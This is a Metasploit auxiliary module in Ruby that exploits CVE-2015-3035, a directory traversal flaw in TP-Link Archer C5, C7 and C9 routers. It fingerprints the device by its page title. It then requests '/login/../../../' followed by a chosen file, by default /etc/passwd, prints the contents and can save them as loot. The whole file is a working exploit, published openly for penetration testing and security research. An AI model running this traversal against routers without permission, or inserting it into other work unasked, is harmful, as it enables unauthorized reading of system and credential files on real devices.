##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Deprecated
  moved_from 'auxiliary/scanner/http/archer_c7_traversal'

  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Archer C7 Directory Traversal Vulnerability',
        'Description' => %q{
          This module exploits a directory traversal vulnerability in the PATH_INFO found at /login/
          on TP-Link Archer C5, C7, and C9 routers of varying versions.
        },
        'References' => [
          [ 'BID', '74050 ' ],
          [ 'CVE', '2015-3035' ]
        ],
        'Author' => [ 'Nick Cottrell <ncottrellweb[at]gmail.com>', 'Anna Graterol <annagraterol95[at]gmail.com>', 'Mana Mostaani <mana.mostaani[at]gmail.com>' ],
        'License' => MSF_LICENSE,
        'DisclosureDate' => '2015-04-08',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => []
        }
      )
      )

    register_options(
      [
        Opt::RPORT(80),
        OptString.new('FILE', [true, 'The file to retrieve', '/etc/passwd']),
        OptBool.new('SAVE', [false, 'Save the HTTP body', false]),
      ]
    )
  end

  def check
    res = send_request_raw({
      'method' => 'GET',
      'uri' => '/'
    })
    return Exploit::CheckCode::Unknown unless res

    device_title = res.get_html_document&.at('//title')&.text
    if device_title =~ /Archer C\d/
      return Exploit::CheckCode::Appears("Target device '#{device_title}'")
    end

    Exploit::CheckCode::Safe('Target does not appear to be an Archer Cx router.')
  end

  def run
    uri = normalize_uri('/login/../../../', datastore['FILE'])
    print_status("Grabbing data at #{uri}")
    res = send_request_raw({
      'method' => 'GET',
      'uri' => uri.to_s
    })

    fail_with(Failure::Unreachable, 'Connection failed') unless res

    fail_with(Failure::NotFound, 'The file does not appear to exist') if res.body.to_s.include?('Error 404 requested page cannot be found')

    # We don't save the body by default, because there's also other junk in it.
    # But we still have a SAVE option just in case
    print_good("#{datastore['FILE']} retrieved")
    print_line(res.body)

    if datastore['SAVE']
      p = store_loot(
        'archer_c7.file',
        'application/octet-stream',
        rhost,
        res.body,
        ::File.basename(datastore['FILE'])
      )
      print_good("File saved as: #{p}")
    end
  end
end
